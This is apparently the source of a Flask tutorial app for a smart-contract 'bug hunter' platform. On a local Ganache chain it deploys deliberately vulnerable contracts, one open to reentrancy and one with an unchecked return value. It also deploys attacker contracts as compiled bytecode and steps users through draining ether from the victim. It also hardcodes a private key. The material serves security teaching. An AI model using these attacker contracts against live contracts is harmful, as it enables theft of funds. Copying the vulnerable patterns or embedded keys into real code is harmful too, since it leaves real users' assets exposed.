import os
import json

from flask import Flask, render_template, request, url_for
from web3 import Web3

def create_app(test_config=None):
    app = Flask(__name__, static_folder='.', static_url_path='', instance_relative_config=True)
    app.config.from_mapping(
        SECRET_KEY='dev',
        DATABASE=os.path.join(app.instance_path, 'flaskr.sqlite'),
        )

    if test_config is None:
        app.config.from_pyfile('config.py', silent=True)
    else:
        app.config.from_mapping(test_config)

    try:
        os.makedirs(app.instance_path)
    except OSError:
        pass

    ganache_url = "http://127.0.0.1:8545"
    web3 = Web3(Web3.HTTPProvider(ganache_url))

    @app.route('/')
    def index():
        # return 'Hello, here is bugs hunter platform'
        return render_template('index.html')

    @app.route('/hall', methods=['GET', 'POST'])
    def hall():
        global user_account
        if request.method == "POST":
            user_account = request.form['account_address']
        else:
            user_account = None
        return render_template('base.html')

    @app.route('/tutorial/')
    def tutorial():
        return render_template('tutorial.html', result=web3.isConnected())


    #--------------------transaction example-------------------------- 

    @app.route('/tutorial/transaction_example')
    def transaction():
        # 发布一个转账transaction，从默认账户1转账到连接的metamask账户
        account_1 = web3.eth.accounts[0]
        account_2 = web3.eth.accounts[1]
        account_3 = '0x04Af3B69B569a74590FA39E22cF48fdf07CE142f'

        private_key = 'cdd65737c197cfc401c7fe82d344c52edacc003503e32e3e60defa6e36c80340'

        nonce = web3.eth.getTransactionCount(account_1)
        tx = {
            'nonce': nonce,
            'to': user_account,
            'value': web3.toWei(1, 'ether'),
            'gas': 2000000,
            'gasPrice': web3.toWei('50', 'gwei')
        }
        signed_tx = web3.eth.account.signTransaction(tx, private_key)
        tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        return render_template('tutorial.html', result=web3.isConnected())

    #---------------------transaction end------------------------------------


    # ---------------reentrancy implementation----------------------------------------
    @app.route('/tutorial/reentrancy_intro/')
    def reentrancy_intro():
        page = request.args.get('page', "No page")
        return render_template('reentrancy_intro.html', page=page)

    @app.route('/tutorial/reentrancy')
    def reentrancy():
        text1 = "The 'ReentrancyGame' is the victim contract that we will attack. Click 'ReentrancyGame deployment' to finish the contrat deployment."
        return render_template('reentrancy.html', result1=None, result2=None, text1=text1)

    @app.route('/tutorial/reentrancy/Game_deployment')
    def Game_deploy():
        # 为演示reentrancy部署两个合约，受害者合约以及攻击者合约
        # 受害者由默认账户部署，攻击者由用户的metamask账户部署
        web3.eth.defaultAccount = web3.eth.accounts[0]

        bytecode_Game = '608060405234801561001057600080fd5b5061045d806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632e1a7d4d1461007257806375807250146100b7578063c71daccb1461010e578063d0e30db014610139578063d5d44d801461015b575b600080fd5b34801561007e57600080fd5b5061009d600480360381019080803590602001909291905050506101b2565b604051808215151515815260200191505060405180910390f35b3480156100c357600080fd5b506100f8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102f2565b6040518082815260200191505060405180910390f35b34801561011a57600080fd5b5061012361033a565b6040518082815260200191505060405180910390f35b610141610359565b604051808215151515815260200191505060405180910390f35b34801561016757600080fd5b5061019c600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610419565b6040518082815260200191505060405180910390f35b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156102e8573373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185875af19250505050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055507f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a94243643383604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a1600190506102ed565b600090505b919050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055507fe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c3334604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a16001905090565b600060205280600052604060002060009150905054815600a165627a7a723058203dc8f7bb54f97af8e1b5ef59ae05c1e3528ec5e5707ea8878cced6cd43b3a0030029'
        abi = json.loads('[{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"creditOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"checkBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[{"name":"","type":"bool"}],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"credit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_who","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_who","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Withdraw","type":"event"}]')
        ReentrancyGame = web3.eth.contract(abi=abi, bytecode=bytecode_Game)

        tx_hash = ReentrancyGame.constructor().transact()
        tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
        contract = web3.eth.contract(
            address = tx_receipt.contractAddress,
            abi = abi
        )

        global contract_G, contract_A
        contract_G = contract
        contract_A = None

        text1 = "Now the deployment of 'ReentrancyGame' contract is finished. You can find the information of 'Contract Address', that is where this contract is successfully deployed."
        text2 = "You can do the same operation to the second contract. This one is attacker contract, which intends to exploit the vulnerability in 'ReentrancyGame'. Just deploy it!"

        return render_template('reentrancy.html', result1=contract_G.address, result2=contract_A.address if contract_A else None, text1=text1, text2=text2)

    @app.route('/tutorial/reentrancy/Attack_deployment')
    def Attack_deploy():
        web3.eth.defaultAccount = web3.eth.accounts[1]

        bytecode_Attack = '60806040526040516020806106608339810180604052810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506105a9806100b76000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634ad69f4e1461013c5780634f4687251461016b5780639e5faafc146101c2578063c71daccb146101f1578063f8a8fd6d1461021c575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050506040513d602081101561012857600080fd5b810190808051906020019092919050505050005b34801561014857600080fd5b5061015161024b565b604051808215151515815260200191505060405180910390f35b34801561017757600080fd5b506101806102d4565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101ce57600080fd5b506101d76102f9565b604051808215151515815260200191505060405180910390f35b3480156101fd57600080fd5b50610206610492565b6040518082815260200191505060405180910390f35b34801561022857600080fd5b506102316104b1565b604051808215151515815260200191505060405180910390f35b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102cc573d6000803e3d6000fd5b506001905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db060016040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016020604051808303818588803b15801561038157600080fd5b505af1158015610395573d6000803e3d6000fd5b50505050506040513d60208110156103ac57600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60016040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15801561044f57600080fd5b505af1158015610463573d6000803e3d6000fd5b505050506040513d602081101561047957600080fd5b8101908080519060200190929190505050506001905090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db060026040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016020604051808303818588803b15801561053957600080fd5b505af115801561054d573d6000803e3d6000fd5b50505050506040513d602081101561056457600080fd5b81019080805190602001909291905050505060019050905600a165627a7a723058201b8c14292f7886424d34f9f61b15b0f92ecaad078ccca9dc750bbd86f2c761560029'
        abi = json.loads('[{"constant":false,"inputs":[],"name":"geteth","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"regame","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"attack","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"checkBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"test","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"addr","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]')
        ReentrancyAttack = web3.eth.contract(abi=abi, bytecode=bytecode_Attack)

        tx_hash = ReentrancyAttack.constructor(contract_G.address).transact({
            'value': 5
            })
        tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)

        contract = web3.eth.contract(
            address = tx_receipt.contractAddress,
            abi = abi
            )

        global contract_A
        contract_A = contract

        text2 = "You can find the information of ReentrancyAttack's contract address. Next, let's check the balance of these two contract accounts"

        return render_template('reentrancy.html', result1=contract_G.address, result2=contract_A.address, text2=text2)

    @app.route('/tutorial/reentrancy/checkBalance', methods=['GET', 'POST'])
    def checkBalance():
        if request.method == 'POST':
            if request.form['submit_button'] == 'GA':
                Balance_G = contract_G.functions.checkBalance().call()
                Balance_A = contract_A.functions.checkBalance().call()
                if Balance_G == 0:
                    text1 = "Here is the value in this contract account. As you can see, the initial value is 0, because we haven't do any deposit. Then we can try to do it"
                    text2 = "Here is the value in this contract account. 5 means we have set a initial value 5 wei in this contract account."
                elif Balance_A != 5:
                    text1 = "You may noticed that something happened. Part of the value in 'ReentrancyGame' contract account is lost."
                    text2 = "Here we find we get some additional ether through attack action. We did exploit the vulnerability in contract 'ReentrancyGame' to successfully steal ether from it."
                else:
                    text1 = "Good job! We successfully deposit 100 wei into this contract account."
                    text2 = "Nothing happens to contract 'ReentrancyAttack'. The value of this contract account is still 5 wei. Now, everything is ready, we can implement the attack by just clicking 'Start to attack!'"
                return render_template('reentrancy.html', result1=contract_G.address, result2=contract_A.address if contract_A else None, Balance_G=Balance_G, Balance_A=Balance_A if contract_A else None, text1=text1, text2=text2) 
            elif request.form['submit_button'] == 'D':
                tx_hash = contract_G.functions.deposit().transact({
                'to': contract_G.address,
                'from': web3.eth.accounts[0],
                'value': 100
                })
                tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
                text1 = "You just finished the 100 wei deposit to ReentrancyGame contract, let's check the balance of these two contracts to see what happens to them."
                return render_template('reentrancy.html', result1=contract_G.address, result2=contract_A.address, text1=text1)
            else:
                return "nop"


    @app.route('/tutorial/reentrancy/attack')
    def reentrancy_attack():
        tx_hash = contract_A.functions.attack().transact()
        tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
        text1 = "Nice! The attack works. What happens to the value of these two contracts?"
        text2 = "Let's check the value once more by clicking 'checkBalance'"
        return render_template('reentrancy.html', result1=contract_G.address, result2=contract_A.address, text1=text1, text2=text2) 

    # ---------------------reentrancy end------------------------------------------


    #--------------------------revertcheck implementation------------------------------
    @app.route('/tutorial/returncheck')
    def returncheck():
        text1 = "'UncheckedGame' is the contrat with retrun value check vulnerability. Click 'UncheckedGame deployment' to deploy this contract on network"
        return render_template('returncheck.html', text1=text1)

    @app.route('/tutorial/returncheck/Game_deployment')
    def UncheckedGame_deploy():
        web3.eth.defaultAccount = web3.eth.accounts[0]

        bytecode_Game = '60806040526000805534801561001457600080fd5b506103f3806100246000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806327e235e3146100675780632e1a7d4d146100be57806352d22518146100eb578063a50ec32614610116575b600080fd5b34801561007357600080fd5b506100a8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610134565b6040518082815260200191505060405180910390f35b3480156100ca57600080fd5b506100e96004803603810190808035906020019092919050505061014c565b005b3480156100f757600080fd5b5061010061029a565b6040518082815260200191505060405180910390f35b61011e6102b9565b6040518082815260200191505060405180910390f35b60016020528060005260406000206000915090505481565b80600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561019a57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050505080600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055508060008082825403925050819055507f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a94243643382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a150565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b600034600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055503460008082825401925050819055507f67d0e209d76ed24370106b1fd0fc1c82de411f7b72ba3d92736b75fe4add443a3334604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a1600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050905600a165627a7a72305820a8d46972f26515e0541ebdb0f7caebe9383ffc21186637da01cbe90f49752e6b0029'
        abi = json.loads('[{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"ownedEth","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"deposite","outputs":[{"name":"","type":"uint256"}],"payable":true,"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_who","type":"address"},{"indexed":false,"name":"_amount","type":"uint256"}],"name":"Deposite","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_who","type":"address"},{"indexed":false,"name":"_amount","type":"uint256"}],"name":"Withdraw","type":"event"}]')
        UncheckedGame = web3.eth.contract(abi=abi, bytecode=bytecode_Game)

        tx_hash = UncheckedGame.constructor().transact()
        tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)

        contract = web3.eth.contract(
            address = tx_receipt.contractAddress,
            abi = abi
        )

        global contract_G1, contract_R1
        contract_G1 = contract
        contract_R1 = None

        text1 = "After the deployment operation, we can find the information of Contract Address, which means the address of this contract on blockchain."
        text2 = "'RevertContract' is a contrat used to exploit the vulnerability in 'UncheckedGame'. Click 'RevertContract deployment' to finish the deployment."

        return render_template('returncheck.html', result1=contract_G1.address, result2=contract_R1.address if contract_R1 else None, text1=text1, text2=text2)

    @app.route('/tutorial/returncheck/Revert_deployment')
    def RevertContract_deploy():
        web3.eth.defaultAccount = web3.eth.accounts[1]

        bytecode_Attack = '608060405234801561001057600080fd5b506102c4806100206000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063069f368c1461005c57806352d2251814610092578063acd7c750146100bd575b600080fd5b610090600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100fd565b005b34801561009e57600080fd5b506100a76101b6565b6040518082815260200191505060405180910390f35b6100fb600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506101d5565b005b600060405180807f6465706f73697465282900000000000000000000000000000000000000000000815250600a019050604051809103902090508173ffffffffffffffffffffffffffffffffffffffff1634827c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af19350505050505050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b600060405180807f77697468647261772875696e74323536290000000000000000000000000000008152506011019050604051809103902090508273ffffffffffffffffffffffffffffffffffffffff16817c01000000000000000000000000000000000000000000000000000000009004836040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303816000875af192505050505050505600a165627a7a7230582020d471bbf64b7027dfd18851b4e333860b0475b57ff51f41ef7848ad4d0af06b0029'
        abi = json.loads('[{"constant":false,"inputs":[{"name":"_addr","type":"address"}],"name":"testDeposite","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[],"name":"ownedEth","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_addr","type":"address"},{"name":"_amount","type":"uint256"}],"name":"testWithdraw","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]')
        RevertContract = web3.eth.contract(abi=abi, bytecode=bytecode_Attack)

        tx_hash = RevertContract.constructor().transact()
        tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)

        contract = web3.eth.contract(
            address = tx_receipt.contractAddress,
            abi = abi
            )

        global contract_R1
        contract_R1 = contract

        text2 = "Here is the address of contract 'RevertContract'. Then we can just click 'checkBalance' to check the initial value of these two contracts."

        return render_template('returncheck.html', result1=contract_G1.address, result2=contract_R1.address, text2=text2)


    @app.route('/tutorial/returncheck/ownedEth', methods=['GET', 'POST'])
    def ownedEth():
        if request.method == 'POST':
            if request.form['submit_button'] == 'UR':
                Balance_G1 = contract_G1.functions.ownedEth().call()
                Balance_R1 = contract_R1.functions.ownedEth().call()
                Balance_RC=contract_G1.functions.balances(contract_R1.address).call()
                if Balance_G1 == 0:
                    text1 = "The balance of 'UncheckedGame' is 0"
                    text2 = "The balance of RevertContract is 0. Then we can use contract 'RevertContract' to deposit some ether in contract 'UncheckedGame'. Just click 'deposit', 100 wei is ready."
                elif Balance_RC == 80:
                    text1 = "The balance of contract 'UncheckedGame' is still 100 wei."
                    text2 = "The balance of contract 'RevertContract' is still 0. What happens? Does the 'withdraw' operation purely fail? Take your curious to check the balance of account 'RevertContract' in 'UncheckedGame' by clicking 'Balance of Account'."
                else:
                    text1 = "We can find the new balance (100 wei) of contract 'UncheckedGame', which means our deposit operation succeed in depositting ether in 'UncheckedGame'."
                    text2 = "There is no change to the balance of contract 'RevertContract'. Even though we operated on 'RevertContract', the 'deposit' module calls the true deposit function from 'UncheckedGame'. By the way, the deposited ehter is under the address of 'RevertContract'. Then check the balance of account 'RevertContract' in 'UncheckedGame' by click 'Balance of Account'."
                return render_template('returncheck.html', result1=contract_G1.address, result2=contract_R1.address if contract_R1 else None, Balance_G1=Balance_G1, Balance_R1=Balance_R1 if contract_R1 else None, text1=text1, text2=text2) 
            elif request.form['submit_button'] == 'D':
                tx_hash = contract_R1.functions.testDeposite(contract_G1.address).transact({
                'to': contract_R1.address,
                'from': web3.eth.accounts[1],
                'value': 100
                })
                tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
                text1 = "The deposit operation is executed successfully, check the value of both contracts once more to see the difference."
                return render_template('returncheck.html', result1=contract_G1.address, result2=contract_R1.address, text1=text1)
            elif request.form['submit_button'] == 'W':
                tx_hash = contract_R1.functions.testWithdraw(contract_G1.address, 20).transact({
                    'to': contract_R1.address,
                    'from': web3.eth.accounts[1]
                    })
                tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
                text1 = "'withdraw' is finished, let's check the balance to see what changes."
                return render_template('returncheck.html', result1=contract_G1.address, result2=contract_R1.address, text1=text1)
            elif request.form['submit_button'] == 'RC':
                Balance_RC = contract_G1.functions.balances(contract_R1.address).call()
                if Balance_RC == 100:
                    text1 = "This is the balance of account 'RevertContract', which means the amount of ether that contract 'RevertContract' have under its own account in contract 'UncheckedGame'"
                    text2 = "Then we can try to do 'withdraw', which is similar to 'deposit'. We operate on 'RevertContract' to call the function module on 'UncheckedGame'. Just click 'withdraw', we set the amount of withdrawed ether to 20 wei."
                else:
                    text1 = "Here is it! The balance of account 'RevertContract' in 'UncheckedGame' is changed to 80. That means the 'withdraw' operation did happen."
                    text2 = "However, the balance of contract 'RevertContract' is still 0. Nothing is transferred from 'UncheckedGame' to 'RevertContract'. The truth is because of the unchecked retrun value of low level call, even though the transfer operation stopped in the middle, ether was still decreased from the account of 'RevertContract'. This leads to the fact that contract 'RevertContract' loses this 20 wei from its account in 'UncheckedGame'."
                return render_template('returncheck.html', result1=contract_G1.address, result2=contract_R1.address if contract_R1 else None, Balance_RC=Balance_RC, Balance_G1=contract_G1.functions.ownedEth().call(), Balance_R1=contract_R1.functions.ownedEth().call() if contract_R1 else None, text1=text1, text2=text2)
            else:
                return "nop"


    #---------------------------returncheck end----------------------------------------


    #-----------------------challenge module------------------------------------------

    @app.route('/challenge')
    def challenge():
        return render_template('challenge.html')

    return app

